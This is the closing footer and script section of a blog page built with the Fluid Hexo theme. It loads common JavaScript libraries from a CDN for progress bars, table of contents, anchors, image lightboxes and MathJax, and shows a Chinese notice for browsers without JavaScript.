  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
